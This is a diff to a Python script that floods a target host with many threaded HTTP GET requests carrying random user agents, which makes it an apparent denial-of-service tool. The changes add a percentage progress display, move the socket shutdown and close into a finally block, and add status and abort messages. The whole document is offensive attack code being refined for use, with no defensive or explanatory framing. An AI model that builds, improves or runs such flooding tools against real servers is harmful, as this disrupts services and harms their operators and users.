@@ -88,7 +88,8 @@ def generate_rand_alpanumeric():
 def print_status():
     global counter
     counter += 1
-    sys.stdout.write(f"{whi}[{yel}INFO{whi}]:{res} Sending HTTP GET request to [{pur}{ip}{res}] ({counter}/{requests_num})\n")
+    percentage = counter * 100 / requests_num
+    sys.stdout.write(f"\r{yel}{int(percentage)}{whi}%{res}  ({counter}/{requests_num})")
     sys.stdout.flush()
 
 
@@ -108,13 +109,14 @@ def http_get_thread():
         request_header = (f"GET /{url_path} HTTP/1.1\r\nHost: {hostname}:{port}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\n\n").encode()
         dos_socket.send(request_header)
 
-        dos_socket.shutdown(socket.SHUT_RDWR)
-        dos_socket.close()
     except socket.error as err:
         print(f"{whi}[{red}ERROR{whi}]:{res} Socket error '{err}'")
         
     except Exception as err:
         print(f"{whi}[{red}ERROR{whi}]:{res} {err}")
+    finally:
+        dos_socket.shutdown(socket.SHUT_RDWR)
+        dos_socket.close()
 
 
 
@@ -123,6 +125,7 @@ if __name__ == '__main__':
     init()
     # List of threads
     threads = list()
+    sys.stdout.write(f"{whi}[{yel}INFO{whi}]:{res} Sending HTTP GET request to [{pur}{ip}{res}]\n")
     try:
         for index in range(requests_num):
             x = threading.Thread(target=http_get_thread)
@@ -135,4 +138,5 @@ if __name__ == '__main__':
             thread.join()
     except KeyboardInterrupt:
         print("\nCtl+C Quitting Attack...!!")
+        print(f"\n{whi}[{yel}CRITICAL{whi}]:{res} User aborted(Ctl+C)")
         exit(1)
